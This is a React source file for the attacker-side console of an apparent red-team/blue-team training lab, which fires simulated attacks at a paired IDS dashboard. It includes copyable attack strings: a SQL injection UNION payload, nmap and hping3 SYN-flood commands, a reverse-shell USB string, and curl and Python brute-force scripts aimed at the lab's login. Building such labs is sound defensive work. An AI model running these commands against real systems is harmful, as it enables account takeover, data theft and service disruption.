import React, { useState, useEffect, useRef } from 'react';
import { useNavigate, Link } from 'react-router-dom';
import {
  Skull,
  Terminal,
  Usb,
  Lock,
  Wifi,
  ShieldOff,
  Send,
  RefreshCw,
  LogOut,
  Server,
  Activity,
  Zap,
  Globe,
  CheckCircle,
  XCircle,
  AlertTriangle,
  Play,
  Pause,
  ExternalLink,
  Shield,
  Layers,
  Flame,
  Code,
  Copy,
  Check
} from 'lucide-react';

interface AttackLog {
  id: string;
  timestamp: string;
  type: string;
  target: string;
  status: 'Launched' | 'Detected' | 'Blocked' | 'Evaded';
  payload?: string;
}

type AttackType =
  | 'brute_force'
  | 'sql_injection'
  | 'usb_drop'
  | 'port_scan'
  | 'syn_flood'
  | 'zero_day';

export const RedTeamConsoleView: React.FC = () => {
  const navigate = useNavigate();

  // Red Team Session verification
  const [session, setSession] = useState<{ operator: string; role: string; token: string } | null>(() => {
    const s = localStorage.getItem('redteam_session');
    return s ? JSON.parse(s) : null;
  });

  useEffect(() => {
    if (!session) {
      navigate('/redteam/login');
    }
  }, [session, navigate]);

  // Client & Target network discovery
  const [clientInfo, setClientInfo] = useState<{
    clientIp: string;
    serverIp: string;
    serverPort: number;
    isBlocked: boolean;
  } | null>(null);

  const fetchClientInfo = async () => {
    try {
      const res = await fetch('/api/hacker/client-info');
      const json = await res.json();
      if (json.success) {
        setClientInfo(json.data);
      }
    } catch (err) {
      console.warn('Network discovery notice:', err);
    }
  };

  useEffect(() => {
    fetchClientInfo();
    const interval = setInterval(fetchClientInfo, 5000);
    return () => clearInterval(interval);
  }, []);

  const defaultProfiles = [
    { id: 'real_device', label: 'My Remote Machine (Real IP)', desc: 'Transmit using this system physical network IP', ip: clientInfo?.clientIp || 'Auto-Detect' },
    { id: 'anon', label: 'Anonymous Script Kiddie', desc: 'Basic dictionary & script probes', ip: '203.0.113.99' },
    { id: 'apt', label: 'APT Nation-State Actor', desc: 'Advanced persistent stealth vectors', ip: '185.22.174.15' },
    { id: 'insider', label: 'Malicious Insider', desc: 'Internal VLAN node with local privilege', ip: '10.0.1.55' },
    { id: 'researcher', label: 'Ethical Red-Teamer', desc: 'Auditing defensive IDS readiness', ip: '198.51.100.99' },
  ];

  const [selectedProfile, setSelectedProfile] = useState(defaultProfiles[0]);
  const [attackType, setAttackType] = useState<AttackType>('brute_force');
  const [targetIp, setTargetIp] = useState(() => window.location.hostname || '127.0.0.1');
  const [targetPort, setTargetPort] = useState(() => Number(window.location.port) || 3000);
  const [customPayload, setCustomPayload] = useState('');
  const [logs, setLogs] = useState<AttackLog[]>([]);
  const [launching, setLaunching] = useState(false);
  const [autoFlood, setAutoFlood] = useState(false);
  const [bfUsername, setBfUsername] = useState('admin@aegis.io');
  const [showCliDrawer, setShowCliDrawer] = useState(false);
  const [copiedKey, setCopiedKey] = useState<string | null>(null);

  const [termOutput, setTermOutput] = useState<string[]>([
    '> AEGIS RED TEAM OFFENSIVE CONSOLE v2.6 — STANDALONE ADVERSARY SURFACE',
    `> Connection: Network route to Blue Team Host: ${window.location.hostname || 'localhost'}:${window.location.port || '3000'}`,
    '> Warning: All packets emitted from this console interact with Blue Team engines',
    '> Multi-System Attack Mode: ACTIVE. Remote machine attacks supported over LAN/Wi-Fi.',
    '─────────────────────────────────────────────────────────────',
  ]);

  const termRef = useRef<HTMLDivElement>(null);
  const floodTimerRef = useRef<NodeJS.Timeout | null>(null);

  useEffect(() => {
    if (termRef.current) {
      termRef.current.scrollTop = termRef.current.scrollHeight;
    }
  }, [termOutput]);

  const handleLogout = () => {
    localStorage.removeItem('redteam_session');
    navigate('/redteam/login');
  };

  const addTermLine = (line: string) => {
    setTermOutput(prev => [...prev, line]);
  };

  const copyToClipboard = (text: string, key: string) => {
    navigator.clipboard.writeText(text);
    setCopiedKey(key);
    setTimeout(() => setCopiedKey(null), 2000);
  };

  const buildAttackPayload = (): string => {
    if (customPayload) return customPayload;
    const payloads: Record<AttackType, string> = {
      brute_force: `POST /api/auth/login {"email":"${bfUsername}","password":"dict_pass_${Math.floor(Math.random() * 9999)}"}`,
      sql_injection: `GET /items?id=' UNION SELECT username,passwordHash FROM users--`,
      usb_drop: `[USB-AUTORUN] /media/usb0/exploit.bin --payload=reverse_shell`,
      port_scan: `nmap -sS -p 1-65535 -T4 ${targetIp}`,
      syn_flood: `hping3 --flood -S -p ${targetPort} ${targetIp}`,
      zero_day: `POST /internal/serializer {"obj":"rO0ABXNyADdjb20uYWVnaXMuaWRz..."}`,
    };
    return payloads[attackType];
  };

  const executeAttack = async (typeOverride?: AttackType) => {
    const typeToRun = typeOverride || attackType;
    setLaunching(true);
    const payload = buildAttackPayload();

    const actualSourceIp = selectedProfile.id === 'real_device'
      ? (clientInfo?.clientIp || 'client_auto')
      : selectedProfile.ip;

    addTermLine('');
    addTermLine(`> [${new Date().toLocaleTimeString()}] INJECT: ${typeToRun.toUpperCase().replace('_', ' ')}`);
    addTermLine(`> Source: ${actualSourceIp} (${selectedProfile.label})`);
    addTermLine(`> Target Host: ${targetIp}:${targetPort}`);
    addTermLine(`> Transmitted Payload: ${payload.substring(0, 75)}...`);

    try {
      const res = await fetch('/api/hacker/attack', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          attackType: typeToRun,
          targetIp,
          targetPort,
          payload,
          sourceIp: actualSourceIp,
          profileId: selectedProfile.id,
        }),
      });
      const json = await res.json();

      if (json.success) {
        const result = json.data;
        addTermLine(`> Blue Team Reaction: ${result.detected ? '⚠ DETECTED BY IDS' : '✓ EVADED IDS'}`);
        addTermLine(`> Gateway Defense: ${result.blocked ? '🛑 BLOCKED & IP BLACKLISTED' : 'PASSED'}`);
        addTermLine(`> Confidence Index: ${result.confidence}%`);
        addTermLine(`> Telemetry Trace: ${result.responseMsg}`);

        const newLog: AttackLog = {
          id: `atk-${Date.now()}-${Math.floor(Math.random() * 1000)}`,
          timestamp: new Date().toISOString(),
          type: typeToRun,
          target: `${targetIp}:${targetPort}`,
          status: result.blocked ? 'Blocked' : result.detected ? 'Detected' : 'Evaded',
          payload: payload.substring(0, 90),
        };
        setLogs(prev => [newLog, ...prev]);

        // Refresh client info
        fetchClientInfo();
      }
    } catch (err: any) {
      addTermLine(`> [CONNECTION ERROR / BLOCKED] Packet drop or connection fault: ${err.message}`);
    } finally {
      setLaunching(false);
    }
  };

  // Automated Brute Force Flooder
  useEffect(() => {
    if (autoFlood) {
      floodTimerRef.current = setInterval(() => {
        executeAttack('brute_force');
      }, 2000);
    } else {
      if (floodTimerRef.current) clearInterval(floodTimerRef.current);
    }
    return () => {
      if (floodTimerRef.current) clearInterval(floodTimerRef.current);
    };
  }, [autoFlood, selectedProfile, bfUsername, targetIp, targetPort]);

  const handleUsbDrop = async (devType: 'ducky' | 'sandisk' | 'custom') => {
    setLaunching(true);
    const devices = {
      ducky: { name: 'BadUSB Rubber Ducky v3', vendor: 'Hak5 Corp', serial: 'SN-ROGUE-0x992B' },
      sandisk: { name: 'SanDisk Ultra Spoofed Drive', vendor: 'SanDisk (Cloned)', serial: 'SN-ROGUE-0x44AA' },
      custom: { name: 'Generic USB Mass Storage', vendor: 'Unknown Hardware', serial: 'USB-VENDOR-0x0012' }
    };

    const targetDev = devices[devType];
    addTermLine('');
    addTermLine(`> [${new Date().toLocaleTimeString()}] HARDWARE ATTACK: Emulating Hardware USB Drop on Blue Team Host`);
    addTermLine(`> Peripheral: ${targetDev.name} (${targetDev.vendor})`);
    addTermLine(`> Hardware Serial: ${targetDev.serial}`);

    try {
      const res = await fetch('/api/hacker/usb-insert', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          deviceName: targetDev.name,
          vendor: targetDev.vendor,
          serial: targetDev.serial,
        }),
      });
      const json = await res.json();
      if (json.success) {
        addTermLine(`> Bus State: ${json.data.status.toUpperCase()}`);
        addTermLine(json.data.detected ? `> ⚠ Blue Team USB Sensor flagged device as rogue!` : `> ✓ Device accepted into system bus.`);
        const newLog: AttackLog = {
          id: `usb-${Date.now()}`,
          timestamp: new Date().toISOString(),
          type: 'usb_drop',
          target: 'Blue Team USB Controller',
          status: json.data.detected ? 'Detected' : 'Evaded',
          payload: `${targetDev.name} [${targetDev.serial}]`,
        };
        setLogs(prev => [newLog, ...prev]);
      }
    } finally {
      setLaunching(false);
    }
  };

  if (!session) return null;

  const statusColor = (s: AttackLog['status']) => {
    if (s === 'Blocked') return 'text-red-400 bg-red-950/30 border-red-500/30';
    if (s === 'Detected') return 'text-amber-400 bg-amber-950/30 border-amber-500/30';
    if (s === 'Evaded') return 'text-emerald-400 bg-emerald-950/30 border-emerald-500/30';
    return 'text-blue-400 bg-blue-950/30 border-blue-500/30';
  };

  const targetHostUrl = `http://${targetIp}:${targetPort}`;

  const curlBruteForceCmd = `for i in {1..6}; do curl -s -X POST "${targetHostUrl}/api/auth/login" -H "Content-Type: application/json" -d '{"email":"admin@aegis.io","password":"wrong_pass_'$i'"}'; echo ""; sleep 1; done`;
  const curlSqlInjectionCmd = `curl -s -X POST "${targetHostUrl}/api/auth/login" -H "Content-Type: application/json" -d '{"email":"admin@aegis.io","password":"'\'' UNION SELECT username,passwordHash FROM users--"}'`;
  const pythonScript = `import requests, time

TARGET = "${targetHostUrl}"
print(f"[*] Attacking Blue Team Host: {TARGET}")

# Test 1: Real Brute Force Ingress
for i in range(1, 7):
    payload = {"email": "admin@aegis.io", "password": f"attack_wordlist_{i}"}
    r = requests.post(f"{TARGET}/api/auth/login", json=payload)
    print(f"[Attempt {i}] Status: {r.status_code} - Response: {r.text[:60]}")
    time.sleep(0.5)

# Test 2: Real SQL Injection Vector
sqli = {"email": "admin@aegis.io", "password": "' UNION SELECT username,passwordHash FROM users--"}
r2 = requests.post(f"{TARGET}/api/auth/login", json=sqli)
print(f"[*] SQLi Probe Status: {r2.status_code}")
`;

  return (
    <div className="min-h-screen bg-[#07090e] text-slate-100 flex flex-col font-mono select-none">

      {/* Red Team Standalone Navigation Bar */}
      <header className="h-16 bg-black/80 border-b border-red-900/40 px-6 flex items-center justify-between sticky top-0 z-40 backdrop-blur-md">
        <div className="flex items-center gap-3">
          <div className="w-9 h-9 rounded-xl bg-red-600 flex items-center justify-center shadow-[0_0_20px_rgba(220,38,38,0.5)] border border-red-400/40">
            <Skull className="w-5 h-5 text-white" />
          </div>
          <div>
            <div className="flex items-center gap-2">
              <span className="font-bold text-sm tracking-wider text-red-400">AEGIS RED TEAM CONSOLE</span>
              <span className="px-2 py-0.5 rounded text-[9px] font-bold bg-red-950/60 border border-red-500/30 text-red-300">
                OFFENSIVE MODE
              </span>
              {clientInfo?.isBlocked && (
                <span className="px-2 py-0.5 rounded text-[9px] font-bold bg-red-600 text-white animate-pulse">
                  YOU ARE QUARANTINED BY FIREWALL
                </span>
              )}
            </div>
            <p className="text-[10px] text-slate-500">Autonomous Multi-System Penetration & Exploit Lab</p>
          </div>
        </div>

        {/* Right side controls */}
        <div className="flex items-center gap-3">
          {/* Live Multi-System Connection HUD */}
          <div className="hidden lg:flex items-center gap-3 px-3 py-1.5 rounded-lg bg-red-950/30 border border-red-900/40 text-[10px]">
            <div>
              <span className="text-slate-500 uppercase block">TARGET HOST</span>
              <span className="text-red-300 font-bold font-mono">{targetIp}:{targetPort}</span>
            </div>
            <div className="h-5 w-px bg-red-900/40"></div>
            <div>
              <span className="text-slate-500 uppercase block">YOUR REMOTE IP</span>
              <span className="text-amber-300 font-bold font-mono">{clientInfo?.clientIp || 'Detecting...'}</span>
            </div>
            <div className="h-5 w-px bg-red-900/40"></div>
            <div>
              <span className="text-slate-500 uppercase block">FIREWALL FILTER</span>
              <span className={`font-bold ${clientInfo?.isBlocked ? 'text-red-400' : 'text-emerald-400'}`}>
                {clientInfo?.isBlocked ? 'BLOCKED' : 'ALLOW'}
              </span>
            </div>
          </div>

          {/* Toggle CLI Exploit scripts modal */}
          <button
            onClick={() => setShowCliDrawer(!showCliDrawer)}
            className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-purple-950/40 hover:bg-purple-900/60 border border-purple-500/30 text-purple-300 text-xs font-semibold transition-colors cursor-pointer"
            title="External Terminal & Script Attacks"
          >
            <Code size={13} />
            <span className="hidden sm:inline">External CLI Exploits</span>
          </button>

          {/* Jump to Blue Team Button */}
          <Link
            to="/"
            className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-blue-950/30 hover:bg-blue-950/60 border border-blue-500/30 text-blue-300 text-xs font-semibold transition-colors cursor-pointer"
            title="Inspect IDS detection on Blue Team Console"
          >
            <Shield size={13} />
            <span className="hidden sm:inline">Blue Team SOC</span>
            <ExternalLink size={11} />
          </Link>

          {/* Logout Red Team */}
          <button
            onClick={handleLogout}
            className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-red-950/40 hover:bg-red-900/60 border border-red-500/30 text-red-300 text-xs font-semibold transition-colors cursor-pointer"
          >
            <LogOut size={13} />
            <span className="hidden sm:inline">Exit Red Team</span>
          </button>
        </div>
      </header>

      {/* Main Red Team Content */}
      <main className="flex-1 p-6 max-w-[1600px] w-full mx-auto space-y-6">

        {/* Remote System Notice Banner */}
        <div className="bg-gradient-to-r from-red-950/40 via-black to-red-950/40 border border-red-900/30 rounded-xl p-3.5 flex flex-col sm:flex-row items-center justify-between gap-3 text-xs">
          <div className="flex items-center gap-2.5">
            <Globe className="w-4 h-4 text-red-400 shrink-0" />
            <div>
              <span className="font-bold text-red-300">MULTI-SYSTEM HACKING ACTIVE: </span>
              <span className="text-slate-400">
                You can attack the Blue Team directly from this browser console OR run external commands from your own laptop terminal (Kali, Mac, PowerShell).
              </span>
            </div>
          </div>
          <div className="flex items-center gap-2 shrink-0">
            <span className="text-[10px] text-slate-500 font-mono">Target: http://{targetIp}:{targetPort}</span>
            <button
              onClick={() => setShowCliDrawer(true)}
              className="px-2.5 py-1 bg-red-900/30 hover:bg-red-900/50 border border-red-500/30 text-red-300 rounded text-[10px] font-bold cursor-pointer"
            >
              Get Raw Scripts →
            </button>
          </div>
        </div>

        {/* Top metrics bar */}
        <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
          {[
            { label: 'Attacks Executed', value: logs.length, color: 'text-red-400' },
            { label: 'Blue Team Blocks', value: logs.filter(l => l.status === 'Blocked').length, color: 'text-rose-500' },
            { label: 'IDS Detections', value: logs.filter(l => l.status === 'Detected').length, color: 'text-amber-400' },
            { label: 'Evasion Success', value: logs.filter(l => l.status === 'Evaded').length, color: 'text-emerald-400' },
          ].map((item, idx) => (
            <div key={idx} className="bg-black/40 border border-red-900/30 rounded-xl p-4">
              <span className="text-[10px] text-slate-500 uppercase tracking-wider block font-semibold">{item.label}</span>
              <span className={`text-2xl font-bold mt-1 block ${item.color}`}>{item.value}</span>
            </div>
          ))}
        </div>

        {/* 2-Column Red Team Grid */}
        <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">

          {/* Left Column: Attack Launchers (5 cols) */}
          <div className="lg:col-span-5 space-y-4">

            {/* Persona Switcher */}
            <div className="bg-black/50 border border-red-900/30 rounded-xl p-4 space-y-2.5">
              <div className="flex items-center justify-between">
                <span className="text-[10px] text-slate-400 uppercase tracking-wider font-bold flex items-center gap-1.5">
                  <Skull size={12} className="text-red-400" /> Attacker Profile / Identity
                </span>
                <span className="text-[9px] text-red-400 font-mono">
                  Source: {selectedProfile.id === 'real_device' ? (clientInfo?.clientIp || 'Detecting...') : selectedProfile.ip}
                </span>
              </div>
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
                {defaultProfiles.map(p => (
                  <button
                    key={p.id}
                    onClick={() => setSelectedProfile(p)}
                    className={`p-2.5 rounded-lg border text-left transition-all cursor-pointer ${
                      selectedProfile.id === p.id
                        ? 'border-red-500/50 bg-red-950/40 text-red-200 shadow-[0_0_10px_rgba(220,38,38,0.2)]'
                        : 'border-slate-900 bg-slate-950/40 text-slate-500 hover:text-slate-300'
                    }`}
                  >
                    <p className="text-[11px] font-bold truncate">{p.label}</p>
                    <p className="text-[9px] text-slate-500 font-mono mt-0.5 truncate">
                      {p.id === 'real_device' ? (clientInfo?.clientIp || 'Real Physical IP') : p.ip}
                    </p>
                  </button>
                ))}
              </div>
            </div>

            {/* Attack Module Selector */}
            <div className="bg-black/50 border border-red-900/30 rounded-xl p-4 space-y-3">
              <span className="text-[10px] text-slate-400 uppercase tracking-wider font-bold flex items-center gap-1.5">
                <Zap size={12} className="text-amber-400" /> Offensive Attack Vectors
              </span>
              <div className="grid grid-cols-3 gap-2">
                {[
                  { id: 'brute_force', label: 'Brute Force', icon: Lock },
                  { id: 'sql_injection', label: 'SQL Injection', icon: Terminal },
                  { id: 'port_scan', label: 'Port Scan', icon: Globe },
                  { id: 'syn_flood', label: 'SYN Flood', icon: Activity },
                  { id: 'zero_day', label: 'Zero-Day RCE', icon: Flame },
                  { id: 'usb_drop', label: 'USB Dropper', icon: Usb },
                ].map(item => {
                  const Icon = item.icon;
                  return (
                    <button
                      key={item.id}
                      onClick={() => setAttackType(item.id as AttackType)}
                      className={`p-2.5 rounded-lg border text-center transition-all cursor-pointer flex flex-col items-center justify-center gap-1.5 ${
                        attackType === item.id
                          ? 'border-red-500/50 bg-red-950/40 text-red-300 shadow-[0_0_12px_rgba(220,38,38,0.25)]'
                          : 'border-slate-900 bg-slate-950/40 text-slate-500 hover:text-slate-300'
                      }`}
                    >
                      <Icon size={14} className={attackType === item.id ? 'text-red-400' : 'text-slate-500'} />
                      <span className="text-[10px] font-semibold">{item.label}</span>
                    </button>
                  );
                })}
              </div>

              {/* Specific Vector Controls */}
              {attackType === 'brute_force' && (
                <div className="p-3 bg-red-950/20 border border-red-900/30 rounded-lg space-y-2">
                  <div className="flex items-center justify-between">
                    <span className="text-[10px] font-bold text-red-300">Target Account</span>
                    <button
                      onClick={() => setAutoFlood(!autoFlood)}
                      className={`flex items-center gap-1 px-2 py-0.5 rounded text-[9px] font-bold cursor-pointer transition-colors ${
                        autoFlood ? 'bg-red-600 text-white animate-pulse' : 'bg-slate-900 text-slate-400 hover:text-slate-200'
                      }`}
                    >
                      {autoFlood ? <Pause size={10} /> : <Play size={10} />}
                      <span>{autoFlood ? 'FLOODING ACTIVE' : 'Auto-Flood (2s)'}</span>
                    </button>
                  </div>
                  <input
                    value={bfUsername}
                    onChange={e => setBfUsername(e.target.value)}
                    placeholder="admin@aegis.io"
                    className="w-full bg-slate-950 border border-red-900/30 text-xs text-red-200 rounded p-1.5 focus:outline-none focus:border-red-500/50 font-mono"
                  />
                  <p className="text-[9px] text-slate-500">Injects rapid invalid password attempts to test the 5-attempt threshold and auto-block filter on the Blue Team host.</p>
                </div>
              )}

              {attackType === 'usb_drop' && (
                <div className="p-3 bg-red-950/20 border border-red-900/30 rounded-lg space-y-2">
                  <span className="text-[10px] font-bold text-red-300">Hardware Emulation Profiles</span>
                  <div className="grid grid-cols-2 gap-2">
                    <button
                      onClick={() => handleUsbDrop('ducky')}
                      disabled={launching}
                      className="p-2 bg-purple-950/40 hover:bg-purple-900/50 border border-purple-500/30 text-purple-300 rounded text-[10px] font-bold cursor-pointer text-left transition-colors"
                    >
                      <p>Hak5 Rubber Ducky</p>
                      <p className="text-[8px] text-slate-500 mt-0.5">SN-ROGUE signature</p>
                    </button>
                    <button
                      onClick={() => handleUsbDrop('sandisk')}
                      disabled={launching}
                      className="p-2 bg-red-950/40 hover:bg-red-900/50 border border-red-500/30 text-red-300 rounded text-[10px] font-bold cursor-pointer text-left transition-colors"
                    >
                      <p>Cloned SanDisk</p>
                      <p className="text-[8px] text-slate-500 mt-0.5">Malware Partition</p>
                    </button>
                  </div>
                </div>
              )}

              {/* Target & Payload Config */}
              <div className="space-y-2 pt-2 border-t border-slate-900">
                <div className="grid grid-cols-3 gap-2">
                  <div className="col-span-2">
                    <label className="text-[9px] text-slate-500 uppercase font-bold block mb-1">Target Host IP</label>
                    <input
                      value={targetIp}
                      onChange={e => setTargetIp(e.target.value)}
                      placeholder="172.20.10.7"
                      className="w-full bg-slate-950 border border-slate-900 text-xs text-slate-200 rounded p-1.5 focus:outline-none focus:border-red-500/40 font-mono"
                    />
                  </div>
                  <div>
                    <label className="text-[9px] text-slate-500 uppercase font-bold block mb-1">Port</label>
                    <input
                      type="number"
                      value={targetPort}
                      onChange={e => setTargetPort(parseInt(e.target.value) || 3000)}
                      className="w-full bg-slate-950 border border-slate-900 text-xs text-slate-200 rounded p-1.5 focus:outline-none focus:border-red-500/40 font-mono"
                    />
                  </div>
                </div>

                <div>
                  <label className="text-[9px] text-slate-500 uppercase font-bold block mb-1">Custom Payload String (Optional)</label>
                  <input
                    value={customPayload}
                    onChange={e => setCustomPayload(e.target.value)}
                    placeholder="Default payload used if empty..."
                    className="w-full bg-slate-950 border border-slate-900 text-xs text-slate-200 rounded p-1.5 focus:outline-none focus:border-red-500/40 font-mono"
                  />
                </div>
              </div>

              {/* Launch Button */}
              <button
                onClick={() => executeAttack()}
                disabled={launching}
                className="w-full py-2.5 rounded-lg bg-red-700 hover:bg-red-600 text-white font-bold text-xs tracking-wider transition-all shadow-[0_0_20px_rgba(220,38,38,0.3)] cursor-pointer disabled:opacity-50 flex items-center justify-center gap-2 mt-2"
              >
                <Send size={13} />
                <span>{launching ? 'TRANSMITTING PACKET OVER NETWORK...' : 'EXECUTE ATTACK VECTOR'}</span>
              </button>
            </div>

          </div>

          {/* Right Column: Terminal + Real-time Reaction Feed (7 cols) */}
          <div className="lg:col-span-7 space-y-4">

            {/* Hacker Terminal */}
            <div className="bg-black border border-red-900/40 rounded-xl overflow-hidden shadow-2xl flex flex-col h-[380px]">
              <div className="h-9 bg-slate-950 border-b border-red-900/30 px-4 flex items-center justify-between">
                <div className="flex items-center gap-2">
                  <div className="w-2.5 h-2.5 rounded-full bg-red-500"></div>
                  <div className="w-2.5 h-2.5 rounded-full bg-amber-500"></div>
                  <div className="w-2.5 h-2.5 rounded-full bg-emerald-500"></div>
                  <span className="text-[10px] text-slate-400 font-mono ml-2">root@redteam-remote:~</span>
                </div>
                <div className="flex items-center gap-3">
                  <span className="text-[9px] text-slate-500 font-mono">Target: {targetIp}:{targetPort}</span>
                  <button
                    onClick={() => setTermOutput(['> Terminal cleared.', '> Standalone Red Team stream ready.'])}
                    className="text-[9px] text-slate-600 hover:text-slate-400 cursor-pointer"
                  >
                    Clear Screen
                  </button>
                </div>
              </div>

              <div
                ref={termRef}
                className="flex-1 p-4 overflow-y-auto font-mono text-[11px] leading-relaxed space-y-1 scrollbar-thin bg-black/90"
              >
                {termOutput.map((line, idx) => (
                  <div
                    key={idx}
                    className={
                      line.includes('DETECTED') || line.includes('BLOCKED')
                        ? 'text-red-400 font-semibold'
                        : line.includes('✓') || line.includes('EVADED')
                        ? 'text-emerald-400'
                        : line.includes('INJECT')
                        ? 'text-amber-300'
                        : 'text-slate-400'
                    }
                  >
                    {line}
                  </div>
                ))}
                {launching && (
                  <div className="text-red-400 animate-pulse">{'>'} Transmitting forged frames over socket... ▊</div>
                )}
              </div>
            </div>

            {/* Attack History Log Table */}
            <div className="bg-black/50 border border-red-900/30 rounded-xl p-4">
              <div className="flex items-center justify-between mb-3 border-b border-slate-900 pb-2">
                <div className="flex items-center gap-2">
                  <ShieldOff size={13} className="text-red-400" />
                  <span className="text-xs font-bold text-slate-200">Attack Transmission Ledger</span>
                </div>
                <span className="text-[10px] text-slate-500">{logs.length} operations</span>
              </div>

              <div className="max-h-52 overflow-y-auto space-y-2 scrollbar-thin">
                {logs.length === 0 ? (
                  <p className="text-xs text-slate-600 text-center py-8">
                    No attacks launched in this session. Configure an attack vector and hit Execute.
                  </p>
                ) : (
                  logs.map(log => (
                    <div
                      key={log.id}
                      className="p-2.5 rounded-lg bg-slate-950/60 border border-slate-900 flex items-center justify-between text-xs"
                    >
                      <div className="space-y-0.5">
                        <div className="flex items-center gap-2">
                          <span className="font-bold text-slate-200">{log.type.replace('_', ' ').toUpperCase()}</span>
                          <span className={`text-[9px] font-bold px-2 py-0.5 rounded border ${statusColor(log.status)}`}>
                            {log.status.toUpperCase()}
                          </span>
                        </div>
                        <p className="text-[10px] text-slate-500 font-mono">
                          Target: {log.target} · {log.payload?.substring(0, 40)}...
                        </p>
                      </div>
                      <span className="text-[9px] text-slate-600 font-mono">
                        {new Date(log.timestamp).toLocaleTimeString()}
                      </span>
                    </div>
                  ))
                )}
              </div>
            </div>

          </div>

        </div>

      </main>

      {/* External CLI Exploits Modal / Drawer */}
      {showCliDrawer && (
        <div className="fixed inset-0 bg-black/80 backdrop-blur-sm z-50 flex items-center justify-center p-4">
          <div className="bg-[#0b0e14] border border-red-900/50 rounded-2xl max-w-2xl w-full p-6 space-y-4 shadow-[0_0_50px_rgba(220,38,38,0.2)]">
            <div className="flex items-center justify-between border-b border-red-900/30 pb-3">
              <div className="flex items-center gap-2">
                <Code className="text-red-400" size={18} />
                <h3 className="text-sm font-bold text-red-300 uppercase tracking-wider">
                  External Terminal Exploits (Run from other laptop)
                </h3>
              </div>
              <button
                onClick={() => setShowCliDrawer(false)}
                className="text-slate-500 hover:text-slate-300 cursor-pointer text-xs font-bold"
              >
                ✕ Close
              </button>
            </div>

            <p className="text-xs text-slate-400">
              Run these commands directly in the terminal of your <strong className="text-red-300">other computer</strong> (Linux, Mac, or Windows CMD) to attack the Blue Team over your Wi-Fi/LAN:
            </p>

            {/* Curl Command 1: Brute Force */}
            <div className="space-y-1.5">
              <div className="flex justify-between items-center text-[10px]">
                <span className="text-slate-400 font-bold">1. REAL BRUTE FORCE LOGIN ATTACK (6 Attempts):</span>
                <button
                  onClick={() => copyToClipboard(curlBruteForceCmd, 'curl1')}
                  className="flex items-center gap-1 text-red-400 hover:text-red-300 cursor-pointer"
                >
                  {copiedKey === 'curl1' ? <Check size={11} /> : <Copy size={11} />}
                  <span>{copiedKey === 'curl1' ? 'Copied' : 'Copy'}</span>
                </button>
              </div>
              <pre className="p-3 bg-black/90 border border-slate-900 rounded-lg text-[10px] text-amber-300 font-mono overflow-x-auto whitespace-pre-wrap">
                {curlBruteForceCmd}
              </pre>
            </div>

            {/* Curl Command 2: SQL Injection */}
            <div className="space-y-1.5">
              <div className="flex justify-between items-center text-[10px]">
                <span className="text-slate-400 font-bold">2. REAL SQL INJECTION PROBE:</span>
                <button
                  onClick={() => copyToClipboard(curlSqlInjectionCmd, 'curl2')}
                  className="flex items-center gap-1 text-red-400 hover:text-red-300 cursor-pointer"
                >
                  {copiedKey === 'curl2' ? <Check size={11} /> : <Copy size={11} />}
                  <span>{copiedKey === 'curl2' ? 'Copied' : 'Copy'}</span>
                </button>
              </div>
              <pre className="p-3 bg-black/90 border border-slate-900 rounded-lg text-[10px] text-amber-300 font-mono overflow-x-auto whitespace-pre-wrap">
                {curlSqlInjectionCmd}
              </pre>
            </div>

            {/* Python Script */}
            <div className="space-y-1.5">
              <div className="flex justify-between items-center text-[10px]">
                <span className="text-slate-400 font-bold">3. PYTHON AUTOMATED ATTACK SCRIPT (attack_blue_team.py):</span>
                <button
                  onClick={() => copyToClipboard(pythonScript, 'py')}
                  className="flex items-center gap-1 text-red-400 hover:text-red-300 cursor-pointer"
                >
                  {copiedKey === 'py' ? <Check size={11} /> : <Copy size={11} />}
                  <span>{copiedKey === 'py' ? 'Copied' : 'Copy'}</span>
                </button>
              </div>
              <pre className="p-3 bg-black/90 border border-slate-900 rounded-lg text-[10px] text-emerald-400 font-mono overflow-x-auto max-h-40 scrollbar-thin whitespace-pre-wrap">
                {pythonScript}
              </pre>
            </div>

            <div className="text-[10px] text-slate-500 pt-2 border-t border-slate-900 flex justify-between items-center">
              <span>Target Host: http://{targetIp}:{targetPort}</span>
              <button
                onClick={() => setShowCliDrawer(false)}
                className="px-4 py-1.5 bg-red-600 hover:bg-red-500 text-white rounded-lg text-xs font-bold cursor-pointer"
              >
                Done
              </button>
            </div>
          </div>
        </div>
      )}

    </div>
  );
};
